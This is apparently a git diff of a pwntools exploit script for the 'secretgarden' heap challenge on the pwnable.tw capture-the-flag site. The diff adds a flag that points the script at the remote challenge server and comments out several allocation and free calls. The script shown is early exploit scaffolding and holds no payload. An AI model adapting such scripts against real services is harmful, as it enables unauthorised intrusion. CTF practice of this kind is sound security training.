@@ -2,7 +2,12 @@ from pwn import *
 
 context.log_level = 'debug'
 
-p = process("./secretgarden", {"PD_LOAD":"./secretgardenlibc_64.so.6"})
+local = 0
+
+if local:
+	p = process("./secretgarden")
+else:
+	p = remote("chall.pwnable.tw", "10203")
 
 def menu(opt):
     p.sendlineafter("Your choice : ", str(opt))
@@ -33,11 +38,11 @@ def show():
 
 
 add(5, "AAAAA")     #0
-add(5, "BBBBB")     #1
-add(5, "CCCCC")     #2
 gdb.attach(p)
-delete(0)           
-delete(1)
-delete(2)
-add(1, "D")
+#add(5, "BBBBB")     #1
+#add(5, "CCCCC")     #2
+#delete(0)           
+#delete(1)
+#delete(2)
+#add(1, "D")
 
